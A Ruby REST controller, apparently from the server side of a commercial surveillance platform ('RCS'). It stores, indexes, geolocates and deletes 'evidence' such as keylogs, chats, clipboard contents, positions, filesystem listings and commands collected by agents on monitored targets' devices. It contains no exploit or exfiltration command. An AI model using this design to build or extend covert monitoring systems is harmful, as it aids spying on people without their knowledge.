#
# Controller for the Evidence objects
#

require_relative '../db_layer'
require_relative '../evidence_manager'
require_relative '../evidence_dispatcher'
require_relative '../position/resolver'
require_relative '../connectors'

# rcs-common
require 'rcs-common/symbolize'
require 'eventmachine'
require 'em-http-request'

# system
require 'time'
require 'json'

module RCS
module DB

class EvidenceController < RESTController

  # this must be a POST request
  # the instance is passed as parameter to the uri
  # the content is passed as body of the request
  def create
    require_auth_level :server, :tech_import

    return conflict if @request[:content]['content'].nil?

    ident = @params['_id'].slice(0..13)
    instance = @params['_id'].slice(15..-1).downcase

    # save the evidence in the db
    begin
      id, shard_id = RCS::DB::EvidenceManager.instance.store_evidence ident, instance, @request[:content]['content']

      # update the evidence statistics
      StatsManager.instance.add evidence: 1, evidence_size: @request[:content]['content'].bytesize
    rescue Exception => e
      trace :warn, "Cannot save evidence: #{e.message}"
      trace :fatal, e.backtrace.join("\n")
      return not_found
    end
    
    trace :info, "Evidence [#{ident}::#{instance}][#{id}] saved and dispatched to shard #{shard_id}"
    return ok({:bytes => @request[:content]['content'].size})
  end

  def update
    require_auth_level :view
    require_auth_level :view_edit

    mongoid_query do
      target = Item.where({_id: @params['target']}).first
      return not_found("Target not found: #{@params['target']}") if target.nil?

      evidence = Evidence.collection_class(target[:_id]).find(@params['_id'])
      @params.delete('_id')
      @params.delete('target')

      # data cannot be modified !!!
      @params.delete('data')

      # keyword index for note
      if @params.has_key? 'note'
        evidence[:kw] += @params['note'].keywords
        evidence.save
      end

      @params.each_pair do |key, value|
        if evidence[key.to_s] != value
          Audit.log :actor => @session.user[:name], :action => 'evidence.update', :desc => "Updated '#{key}' to '#{value}' for evidence #{evidence[:_id]}"
        end
      end

      evidence.update_attributes(@params)

      return ok(evidence)
    end
  end

  def show
    require_auth_level :view

    mongoid_query do
      target = Item.where({_id: @params['target']}).first
      return not_found("Target not found: #{@params['target']}") if target.nil?

      evidence = Evidence.collection_class(target[:_id]).where({_id: @params['_id']}).without(:kw).first

      # get a fresh decoding of the position
      if evidence[:type] == 'position'
        result = PositionResolver.decode_evidence(evidence[:data])
        evidence[:data] = evidence[:data].merge(result)
        evidence.save
      end

      return ok(evidence)
    end
  end

  def destroy
    require_auth_level :view_delete

    return conflict("Unable to delete") unless LicenseManager.instance.check :deletion

    mongoid_query do
      target = Item.where({_id: @params['target']}).first
      return not_found("Target not found: #{@params['target']}") if target.nil?

      evidence = Evidence.collection_class(target[:_id]).find(@params['_id'])
      agent = Item.find(evidence[:aid])
      agent.stat.evidence[evidence.type] -= 1 if agent.stat.evidence[evidence.type]
      agent.stat.size -= evidence.data.to_s.length
      agent.stat.grid_size -= evidence.data[:_grid_size] unless evidence.data[:_grid].nil?
      agent.save

      Audit.log :actor => @session.user[:name], :action => 'evidence.destroy', :desc => "Deleted evidence #{evidence.type} #{evidence[:_id]}"

      evidence.destroy

      return ok
    end
  end

  def destroy_all
    require_auth_level :view_delete

    return conflict("Unable to delete") unless LicenseManager.instance.check :deletion

    Audit.log :actor => @session.user[:name], :action => 'evidence.destroy',
              :desc => "Deleted multi evidence from: #{Time.at(@params['from'])} to: #{Time.at(@params['to'])} relevance: #{@params['rel']} type: #{@params['type']}"

    #trace :debug, "Deleting evidence: #{@params}"

    task = {name: "delete multi evidence",
            method: "::Evidence.offload_delete_evidence",
            params: @params}

    OffloadManager.instance.run task

    return ok
  end

  def translate
    require_auth_level :view

    mongoid_query do
      target = Item.where({_id: @params['target']}).first
      return not_found("Target not found: #{@params['target']}") if target.nil?

      evidence = Evidence.collection_class(target[:_id]).where({_id: @params['_id']}).without(:kw).first

      # add to the translation queue
      if LicenseManager.instance.check(:translation) and ['keylog', 'chat', 'clipboard', 'message'].include? evidence.type
        TransQueue.add(target._id, evidence._id)
        evidence.data[:tr] = "TRANS_QUEUED"
        evidence.save
      end

      return ok(evidence)
    end
  end

  def body
    require_auth_level :view

    mongoid_query do
      target = Item.where({_id: @params['target']}).first
      return not_found("Target not found: #{@params['target']}") if target.nil?

      evidence = Evidence.collection_class(target[:_id]).find(@params['_id'])

      return ok(evidence.data['body'], {content_type: 'text/html'})
    end
  end

  # used to report that the activity of an instance is starting
  def start
    require_auth_level :server, :tech_import
    
    # create a phony session
    session = @params.symbolize
    
    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return not_found("Agent not found: #{session[:bid]}") if agent.nil?
    
    # convert the string time to a time object to be passed to 'sync_start'
    time = Time.at(@params['sync_time']).getutc

    trace :info, "#{agent[:name]} sync started [#{agent[:ident]}:#{agent[:instance]}]"

    # update the agent version
    agent.version = @params['version']

    # reset the counter for the dashboard
    agent.reset_dashboard
    
    # update the stats
    agent.stat[:last_sync] = time
    agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_IN_PROGRESS
    agent.stat[:source] = @params['source']
    agent.stat[:user] = @params['user']
    agent.stat[:device] = @params['device']
    agent.save

    # update the stat of the target
    target = agent.get_parent
    target.stat[:last_sync] = time
    target.stat[:last_child] = [agent[:_id]]
    target.reset_dashboard
    target.save

    # update the stat of the operation
    operation = target.get_parent
    operation.stat[:last_sync] = time
    operation.stat[:last_child] = [target[:_id]]
    operation.save

    # check for alerts on this agent
    Alerting.new_sync agent

    # remember the address of each sync
    insert_sync_address(target, agent, @params['source'])

    return ok
  end

  def insert_sync_address(target, agent, address)

    # resolv the position of the address
    position = PositionResolver.get({'ipAddress' => {'ipv4' => address}})

    # add the evidence to the target
    ev = Evidence.dynamic_new(target[:_id])
    ev.type = 'ip'
    ev.da = Time.now.getutc.to_i
    ev.dr = Time.now.getutc.to_i
    ev.aid = agent[:_id].to_s
    ev[:data] = {content: address}
    ev[:data] = ev[:data].merge(position)
    ev.save

    Connectors.new_evidence(ev)
  end

  # used by the collector to update the synctime during evidence transfer
  def start_update
    require_auth_level :server, :tech_import

    # create a phony session
    session = @params.symbolize

    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return not_found("Agent not found: #{session[:bid]}") if agent.nil?

    trace :info, "#{agent[:name]} sync update [#{agent[:ident]}:#{agent[:instance]}]"

    # convert the string time to a time object to be passed to 'sync_start'
    time = Time.at(@params['sync_time']).getutc

    # update the agent version
    agent.version = @params['version']

    # update the stats
    agent.stat[:last_sync] = time
    agent.stat[:source] = @params['source']
    agent.stat[:user] = @params['user']
    agent.stat[:device] = @params['device']
    agent.save

    # update the stat of the target
    target = agent.get_parent
    target.stat[:last_sync] = time
    target.stat[:last_child] = [agent[:_id]]
    target.save

    # update the stat of the operation
    operation = target.get_parent
    operation.stat[:last_sync] = time
    operation.stat[:last_child] = [target[:_id]]
    operation.save

    return ok
  end

  # used to report that the processing of an instance has finished
  def stop
    require_auth_level :server, :tech_import

    # create a phony session
    session = @params.symbolize

    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return not_found("Agent not found: #{session[:bid]}") if agent.nil?

    trace :info, "#{agent[:name]} sync end [#{agent[:ident]}:#{agent[:instance]}]"

    agent.stat[:last_sync] = Time.now.getutc.to_i
    agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_IDLE
    agent.save

    return ok
  end

  # used to report that the activity on an instance has timed out
  def timeout
    require_auth_level :server

    # create a phony session
    session = @params.symbolize

    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return not_found("Agent not found: #{session[:bid]}") if agent.nil?

    agent.stat[:last_sync] = Time.now.getutc.to_i
    agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_TIMEOUTED
    agent.save

    return ok
  end

  def index
    require_auth_level :view

    mongoid_query do

      filter, filter_hash, target = ::Evidence.common_filter @params
      return not_found("Target or Agent not found") if filter.nil?

      geo_near_coordinates = filter_hash.delete('geoNear_coordinates')
      geo_near_accuracy = filter_hash.delete('geoNear_accuracy')

      # copy remaining filtering criteria (if any)
      filtering = Evidence.collection_class(target[:_id]).not_in(:type => ['filesystem', 'info', 'command', 'ip'])
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end

      # paging
      if @params.has_key? 'startIndex' and @params.has_key? 'numItems'
        start_index = @params['startIndex'].to_i
        num_items = @params['numItems'].to_i
        query = filtering.where(filter_hash).without(:body, :kw, 'data.body').order_by([[:da, :asc]]).skip(start_index).limit(num_items)
      else
        # without paging, return everything
        query = filtering.where(filter_hash).without(:body, :kw, 'data.body').order_by([[:da, :asc]])
      end

      if geo_near_coordinates
        query = query.positions_within(geo_near_coordinates, geo_near_accuracy)
      end

      # fix to provide correct stats
      return ok(query, {gzip: true})
    end
  end

  def count
    require_auth_level :view

    mongoid_query do

      filter, filter_hash, target = ::Evidence.common_filter @params
      return not_found("Target or Agent not found") if filter.nil?

      geo_near_coordinates = filter_hash.delete('geoNear_coordinates')
      geo_near_accuracy = filter_hash.delete('geoNear_accuracy')

      # copy remaining filtering criteria (if any)
      filtering = Evidence.collection_class(target[:_id]).not_in(:type => ['filesystem', 'info', 'command', 'ip'])
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end

      filtering = filtering.where(filter_hash)

      if geo_near_coordinates
        filtering = filtering.positions_within(geo_near_coordinates, geo_near_accuracy)
      end

      num_evidence = filtering.count

      # Flex RPC does not accept 0 (zero) as return value for a pagination (-1 is a safe alternative)
      num_evidence = -1 if num_evidence == 0
      return ok(num_evidence)
    end
  end

  def info
    require_auth_level :view, :tech

    mongoid_query do

      filter, filter_hash, target = ::Evidence.common_filter @params
      return not_found("Target or Agent not found") if filter.nil?

      # copy remaining filtering criteria (if any)
      filtering = Evidence.collection_class(target[:_id]).where({:type => 'info'})
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end

      # without paging, return everything
      query = filtering.where(filter_hash).order_by([[:da, :asc]])

      return ok(query)
    end
  end

  def total
    require_auth_level :view

    mongoid_query do

      # filtering
      filter = {}
      filter = JSON.parse(@params['filter']) if @params.has_key? 'filter'

      # filter by target
      target = Item.where({_id: filter['target']}).first
      return not_found("Target not found") if target.nil?

      condition = {}

      # filter by agent
      if filter['agent']
        agent = Item.where({_id: filter['agent']}).first
        return not_found("Agent not found") if agent.nil?
        condition[:aid] = filter['agent']
      end

      stats = []
      Evidence.collection_class(target).count_by_type(condition).each do |type, count|
        stats << {type: type, count: count}
      end

      total = stats.collect {|b| b[:count]}.inject(:+)
      stats << {type: "total", count: total}

      return ok(stats)
    end
  end

  def filesystem
    require_auth_level :view
    require_auth_level :view_filesystem

    mongoid_query do

      # filter by target
      target = Item.where({_id: @params['target']}).first
      return not_found("Target not found") if target.nil?

      agent = nil

      # filter by agent
      if @params.has_key? 'agent'
        agent = Item.where({_id: @params['agent']}).first
        return not_found("Agent not found") if agent.nil?
      end

      # copy remaining filtering criteria (if any)
      filtering = Evidence.collection_class(target[:_id]).where({:type => 'filesystem'})
      filtering = filtering.any_in(:aid => [agent[:_id]]) unless agent.nil?

      if @params['filter']

        #filter = @params['filter']

        # complete the request with some regex magic...
        filter = "^" + Regexp.escape(@params['filter']) + "[^\\\\\\\/]+$"

        # special case if they request the root
        filter = "^[[:alpha:]]:$" if @params['filter'] == "[root]" and ['windows', 'winmo', 'symbian', 'winphone'].include? agent.platform
        filter = "^\/$" if @params['filter'] == "[root]" and ['blackberry', 'android', 'osx', 'ios', 'linux'].include? agent.platform

        filtering = filtering.and({"data.path".to_sym => Regexp.new(filter, Regexp::IGNORECASE)})
      end

      # perform de-duplication and sorting at app-layer and not in mongo
      # because the data set can be larger than mongo is able to handle
      data = filtering.to_a
      data.uniq! {|x| x[:data]['path']}
      data.sort! {|x, y| x[:data]['path'].downcase <=> y[:data]['path'].downcase}

      trace :debug, "Filesystem request #{filter} resulted in #{data.size} entries"

      return ok(data)
    end
  end

  def commands
    require_auth_level :view, :tech_exec

    mongoid_query do

      filter, filter_hash, target = ::Evidence.common_filter @params
      return not_found("Target or Agent not found") if filter.nil?

      # copy remaining filtering criteria (if any)
      filtering = Evidence.collection_class(target[:_id]).where({:type => 'command'})
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end

      # without paging, return everything
      query = filtering.where(filter_hash).order_by([[:da, :asc]])

      return ok(query)
    end
  end


  def ips
    require_auth_level :view, :tech

    mongoid_query do

      filter, filter_hash, target = ::Evidence.common_filter @params
      return not_found("Target or Agent not found") if filter.nil?

      # copy remaining filtering criteria (if any)
      filtering = Evidence.collection_class(target[:_id]).where({:type => 'ip'})
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end

      # without paging, return everything
      query = filtering.where(filter_hash).order_by([[:da, :asc]])

      return ok(query)
    end
  end


end

end #DB::
end #RCS::